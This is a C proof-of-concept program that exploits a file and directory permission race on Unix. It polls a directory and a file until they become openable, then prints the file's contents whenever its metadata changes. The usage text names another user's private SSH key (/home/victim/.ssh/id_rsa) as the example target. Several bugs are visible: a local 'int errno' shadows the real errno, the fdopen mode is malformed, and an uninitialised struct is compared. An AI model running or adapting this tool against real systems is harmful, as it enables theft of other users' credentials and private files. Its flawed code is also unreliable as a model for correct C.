#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define MAX_READ (1024*1024)

#ifdef O_SEARCH
// untested!
#define DIRMODE O_SEARCH
#define DIRMODE_DESC \
  "O_SEARCH is supported on this system! Directory permission changes should not\n" \
  "affect the ability to open the file. See README.md for details.\n"
#else
#define DIRMODE O_RDONLY
#define DIRMODE_DESC \
  "O_SEARCH is NOT supported on this system. Directory permissions are evaluated\n" \
  "when the file is opened. See README.md for details.\n"
#endif

int main(int argc, char** argv) {
  if (argc != 3 || argv[1][0] == '-' || argv[2][0] == '-') {
    printf(
      "racereaddir: file/directory permission race condition proof of concept\n\n"
      "Usage:   racereaddir <dir> <filename>\n\n"
      "Example: racereaddir /home/victim/.ssh id_rsa\n\n"
      "Attempts to open a directory until it succeeds. Then attempts to open the file\n"
      "inside that directory until it succeeds, then prints file stats and content on\n"
      "each file stat change.\n\n"
      DIRMODE_DESC);
    exit(2);
  }

  printf("Attempting to repeatedly open dir '%s' until successful...\n", argv[1]);
  printf(DIRMODE_DESC);
  int dirfd = -1;
  int last_errno = 0;
  int errno;

  while (dirfd < 0) {
    dirfd = open(argv[1], DIRMODE | O_DIRECTORY);
    if (dirfd < 0 && errno != last_errno) {
      last_errno = errno;
      perror("open() on directory");
    }
  }  
  
  printf("Got the directory!\n");

  printf("Attempting to repeatedly open file '%s' until successful...\n", argv[2]);
  
  int fd = -1;
  last_errno = 0;

  while (fd < 0) {
    fd = openat(dirfd, argv[2], O_RDONLY);
    if (fd < 0 && errno != last_errno) {
      last_errno = errno;
      perror("openat() on file");
    }
  }

  FILE* fp = fdopen(fd, "r'");
  if (fp == NULL) {
    perror("fdopen() on already open file");
    printf("I did not know this was even possible. Goodbye.");
    return 1;
  }

  struct stat curr_stat;
  struct stat last_stat;
  char buf[MAX_READ];

  while (1) {
    // fetch and print stat and content each time it changes
    fstat(fileno(fp), &curr_stat);
    if (memcmp(&curr_stat, &last_stat, sizeof(last_stat)) != 0) {
      memcpy(&last_stat, &curr_stat, sizeof(last_stat));
      printf(
        "\n\n===== Stat change =====\n"
        "mode: o%03o   uid: %-5d  gid: %-5d  size: %zu\n"
        "atime: %ld   mtime: %ld   ctime: %ld\n"
        "-- content --\n",
        curr_stat.st_mode & 07777, curr_stat.st_uid, curr_stat.st_gid, curr_stat.st_size,
        curr_stat.st_atime, curr_stat.st_mtime, curr_stat.st_ctime);
      
      rewind(fp);
      size_t copied = fread(buf, 1, MAX_READ, fp);
      if (ferror(fp)) {
        printf("-- reading content failed --\n");
        continue;
      }
      size_t written = write(STDOUT_FILENO, buf, copied);
      if (written != copied) {
        printf("-- some content was not output --\n");
      }
      if (feof(fp)) {
        printf("-- end of content (%ld bytes) --\n", copied);
      } else {
        printf("-- max content length reached (%ld bytes) --\n", copied);
      }
    }
  }
}
